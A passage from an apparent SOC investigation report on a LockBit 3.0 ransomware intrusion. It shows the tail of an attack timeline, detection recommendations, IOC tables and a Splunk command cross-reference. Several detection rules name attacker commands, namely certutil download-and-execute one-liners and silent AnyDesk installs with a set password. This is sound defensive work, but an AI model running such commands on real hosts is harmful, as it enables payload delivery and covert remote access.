| **10:30:08** | **Ransomware Weaponization (on-host)** | `C:\Intel\builder.exe` (the leaked **LockBit 3.0 Builder**) generates `LB3.exe`, `LB3_pass.exe`, `LB3Decryptor.exe`, and DLL variants |
| **10:31:57–10:32:10** | **Detonation** | `explorer.exe` (interactive session) launches `LB3_pass.exe` then `LB3.exe` |
| **10:32:xx** | **Defense Evasion** | `LB3.exe` performs **2,030 registry writes** disabling ~1,015 Windows Event Log channels |
| **10:32:15+** | **Impact** | `LB3.exe` drops **183 ransom notes** (`7duXYi3SC.README.txt`) across the filesystem |

---


---

## Recommended SOC Actions

1. **Contain immediately** any host where `builder.exe` or a `builder`-style command line is observed — this precedes detonation by only ~2 minutes in this dataset.
2. **Alert on `certutil -urlcache` + `start /B`/`&` in the same command line** — the download-and-immediately-execute one-liner pattern from UC1 is high-confidence malicious regardless of destination.
3. **Alert on any process disabling >50 Windows Event Log channels within a short window** (UC5) — this is a near-zero-false-positive defense-evasion signature.
4. **Treat `AnyDesk --set-password` / `--install --silent` as a P1 alert** on any server that did not have AnyDesk previously deployed via approved software management.
5. **Baseline and alert on `rare` process lineages weekly**, not just `top` — UC10 demonstrates the single most important IOC in this investigation was a frequency-1 outlier.
6. **Do not assume PowerShell obfuscation is present** just because 4104 events exist — triage by content (UC12) before assuming malicious intent from volume alone.

---

## Appendix A: Indicators of Compromise (IOCs)

| Type | Value | Context |
|---|---|---|
| File hash (SHA256) | `F6A283B7CA0D665C7420C313C14A16ECF67EDE5DB0940177544F446B5D1DB10B` | `qSwUwejx.exe` (loader) |
| File hash (SHA256) | `A736269F5F3A9F2E11DD776E352E1801BC28BB699E47876784B8EF761E0062DB` | `builder.exe` (LockBit 3.0 Builder) |
| File hash (SHA256) | `652376397428E624E3305EB21C40ADBE8CC81F091F646CA49FF4F694FA3DC8A4` | `LB3_pass.exe` (encryptor, password variant) |
| File hash (SHA256) | `8ADCB1AE01F295EBD4A50B6BB41F9FE05AE90FC7E655002A8C400F7F9D05A582` | `LB3.exe` (encryptor) |
| File path | `C:\Intel\builder.exe`, `C:\Intel\Build\LB3*.exe`, `C:\Intel\Build\LB3*.dll` | LockBit build artifacts |
| File name pattern | `7duXYi3SC.README.txt` | Ransom note (183 instances) |
| Network | `10.0.2.13:8080` | Internal payload staging server |
| Network | `104.18.21.213`, `104.18.38.233`, `172.64.149.23` | Cloudflare (certutil traffic) |
| Network | `185.199.108.133` | GitHub Pages (certutil traffic) |
| Network | `23.39.41.123` | (certutil traffic) |
| Network | `4.208.26.197` | Microsoft/Azure (certutil traffic) |
| Credential | AnyDesk password `123456` | Attacker-set, weak |
| Process name | `qSwUwejx.exe` | Random-named loader in `%TEMP%\2\` |

---

## Appendix B: Command-to-Use-Case Cross-Reference (for future reuse)

| Command/Function | Use Case(s) | Verified? |
|---|---|---|
| `search` | All | ✅ |
| `table` | UC1, UC2, UC4, UC7–UC9, UC13, UC14 | ✅ |
| `sort` | UC1, UC4, UC7, UC10, UC11, UC14 | ✅ |
| `stats` | UC3, UC5, UC9, UC14–16 | ✅ |
| `eval` | UC2, UC7, UC9, UC13 | ✅ |
| `rex` | UC2, UC12 | ✅ |
| `where` | UC7, UC12 | ✅ |
| `dedup` | UC4 | ✅ |
| `timechart` | UC6 (window logic), master timeline | ✅ |
| `top` | UC11 | ✅ |
| `rare` | UC10 | ✅ |
| `iplocation` | UC7 | ✅ |
| `cidrmatch()` | UC7 | ✅ |
| `transaction` | UC8 | ✅ |
| `fields` | UC2, UC14 | ✅ |
| `values()`/`list()` | UC3 | ✅ |
| `eventstats` | UC5 | ✅ |
| `streamstats` | UC6 | ✅ |
| `spath` | UC13 | ✅ |
| `join` | UC14 | ✅ |
| `subsearch` | UC15 | ✅ |
| `append`/`appendcols`/`appendpipe` | UC16 | ✅ |
| `case()` | UC9 | ✅ |
| `match()` | UC9, UC12 | ✅ |

**Every command above was executed against this live dataset during report preparation; every output table shown is real.**
